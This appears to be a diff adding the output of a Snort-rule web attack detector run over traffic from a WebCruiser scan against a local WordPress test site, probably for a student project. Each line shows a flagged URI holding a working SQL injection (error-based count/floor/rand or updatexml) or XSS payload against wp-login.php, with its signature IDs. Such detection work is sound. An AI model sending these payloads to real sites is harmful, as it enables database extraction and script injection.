@@ -1,0 +1,35 @@
+# inspectorlog v3.5
+#----- Initializing Rules (SNORT) ---------------------
+# Rules directory : "/home/kali/Downloads/reglas_javi/snort"
+#	Opening SNORT rule file /home/kali/Downloads/reglas_javi/snort/http_uri-sn-20220324.rules... done
+#		Rules: read [3749], erroneous [0], URI [384]
+#	Opening SNORT rule file /home/kali/Downloads/reglas_javi/snort/http_uri-er-20220224.rules... done
+[parse_snortRule] WARNING: Line [4970] exceeds allowed number of PCRE fields
+#		Rules: read [6015], erroneous [0], URI [5116]
+#----- Statistics (SNORT) ------------------------------
+# Read [9764] Snort rules, [5500] http-related, [0] with errors
+#----- Analysis results ----------------------------
+# Alerts & signatures generated from: /home/kali/Downloads/inspectorlog/inspectorlog -l webcruiser.short -r /home/kali/Downloads/reglas_javi/snort -t list -o /home/kali/TFG/ficheros_uris_completos/web_dinamica//snort/webcruiser_short.clean
+Packet [21]	Uri [/web/2022/02/02/hola-mundo/?replytocom=1%20or%20(select%201%20from%20(select%20count(*),concat((0x574352575653),0x5E,floor(rand(0)*2))%20x%20from%20information_schema.tables%20group%20by%20x)a)]	Nattacks [3]	Signatures	[2006445]	[2011042]	[2017808]
+Packet [53]	Uri [/web/2022/02/02/hola-mundo/?replytocom=1%27%20or%20(select%201%20from%20(select%20count(*),concat((0x574352575653),0x5E,floor(rand(0)*2))%20x%20from%20information_schema.tables%20group%20by%20x)a)%20or%20%27]	Nattacks [3]	Signatures	[2006445]	[2011042]	[2017808]
+Packet [1268]	Uri [/web/wp-login.php?action=lostpassword%20%20onmouseover=%20alert(5443113)]	Nattacks [1]	Signatures	[2009715]
+Packet [1299]	Uri [/web/wp-login.php?action=lostpassword%27%20or%20(select%201%20from%20(select%20count(*),concat((0x574352575653),0x5E,floor(rand(0)*2))%20x%20from%20information_schema.tables%20group%20by%20x)a)%20or%20%27]	Nattacks [3]	Signatures	[2006445]	[2011042]	[2017808]
+Packet [1377]	Uri [/web/wp-login.php?wp_lang=en_US%22%20onmouseover=%22alert(6009617)]	Nattacks [1]	Signatures	[2009715]
+Packet [1402]	Uri [/web/wp-login.php?wp_lang=en_US%22)/**/oR/**/updatexml(1,concat(0x5e,(0x574352575653)),0)/**/oR/**/(%22]	Nattacks [1]	Signatures	[16431]
+Packet [1405]	Uri [/web/wp-login.php?wp_lang=en_US%22/**/oR/**/updatexml(1,concat(0x5e,(0x574352575653)),0)/**/oR/**/%22]	Nattacks [1]	Signatures	[16431]
+Packet [1415]	Uri [/web/wp-login.php?wp_lang=en_US%27%20or%20(select%201%20from%20(select%20count(*),concat((0x574352575653),0x5E,floor(rand(0)*2))%20x%20from%20information_schema.tables%20group%20by%20x)a)%20or%20%27]	Nattacks [3]	Signatures	[2006445]	[2011042]	[2017808]
+Packet [1444]	Uri [/web/wp-login.php?wp_lang=en_US%27)/**/oR/**/updatexml(1,concat(0x5e,(0x574352575653)),0)/**/oR/**/(%27]	Nattacks [1]	Signatures	[16431]
+Packet [1448]	Uri [/web/wp-login.php?wp_lang=en_US%27/**/or/**/(select/**/1/**/from/**/(select/**/count(*),concat((0x574352575653),0x5E,floor(rand(0)*2))/**/x/**/from/**/information_schema.tables/**/group/**/by/**/x)a)/**/or/**/%27]	Nattacks [3]	Signatures	[2006445]	[2011042]	[2017808]
+Packet [1449]	Uri [/web/wp-login.php?wp_lang=en_US%27/**/oR/**/updatexml(1,concat(0x5e,(0x574352575653)),0)/**/oR/**/%27]	Nattacks [1]	Signatures	[16431]
+Packet [1497]	Uri [/web/wp-login.php?wp_lang=en_US&action=lostpassword%22)/**/oR/**/updatexml(1,concat(0x5e,(0x574352575653)),0)/**/oR/**/(%22]	Nattacks [1]	Signatures	[16431]
+Packet [1499]	Uri [/web/wp-login.php?wp_lang=en_US&action=lostpassword%22/**/oR/**/updatexml(1,concat(0x5e,(0x574352575653)),0)/**/oR/**/%22]	Nattacks [1]	Signatures	[16431]
+Packet [1517]	Uri [/web/wp-login.php?wp_lang=en_US&action=lostpassword%27)/**/oR/**/updatexml(1,concat(0x5e,(0x574352575653)),0)/**/oR/**/(%27]	Nattacks [1]	Signatures	[16431]
+Packet [1520]	Uri [/web/wp-login.php?wp_lang=en_US&action=lostpassword%27/**/or/**/(select/**/1/**/from/**/(select/**/count(*),concat((0x574352575653),0x5E,floor(rand(0)*2))/**/x/**/from/**/information_schema.tables/**/group/**/by/**/x)a)/**/or/**/%27]	Nattacks [3]	Signatures	[2006445]	[2011042]	[2017808]
+Packet [1521]	Uri [/web/wp-login.php?wp_lang=en_US&action=lostpassword%27/**/oR/**/updatexml(1,concat(0x5e,(0x574352575653)),0)/**/oR/**/%27]	Nattacks [1]	Signatures	[16431]
+Packet [1570]	Uri [/web/wp-login.php?wp_lang=en_US&redirect_to=http://192.168.1.104/web/wp-admin/%22)/**/oR/**/updatexml(1,concat(0x5e,(0x574352575653)),0)/**/oR/**/(%22]	Nattacks [1]	Signatures	[16431]
+Packet [1573]	Uri [/web/wp-login.php?wp_lang=en_US&redirect_to=http://192.168.1.104/web/wp-admin/%22/**/oR/**/updatexml(1,concat(0x5e,(0x574352575653)),0)/**/oR/**/%22]	Nattacks [1]	Signatures	[16431]
+Packet [1592]	Uri [/web/wp-login.php?wp_lang=en_US&redirect_to=http://192.168.1.104/web/wp-admin/%27)/**/oR/**/updatexml(1,concat(0x5e,(0x574352575653)),0)/**/oR/**/(%27]	Nattacks [1]	Signatures	[16431]
+Packet [1596]	Uri [/web/wp-login.php?wp_lang=en_US&redirect_to=http://192.168.1.104/web/wp-admin/%27/**/or/**/(select/**/1/**/from/**/(select/**/count(*),concat((0x574352575653),0x5E,floor(rand(0)*2))/**/x/**/from/**/information_schema.tables/**/group/**/by/**/x)a)/**/or/**/%27]	Nattacks [3]	Signatures	[2006445]	[2011042]	[2017808]
+Packet [1597]	Uri [/web/wp-login.php?wp_lang=en_US&redirect_to=http://192.168.1.104/web/wp-admin/%27/**/oR/**/updatexml(1,concat(0x5e,(0x574352575653)),0)/**/oR/**/%27]	Nattacks [1]	Signatures	[16431]
+# N. packets [1605], [21] with alerts, N. Alerts [35]
+# Execution time: 0.050937 s
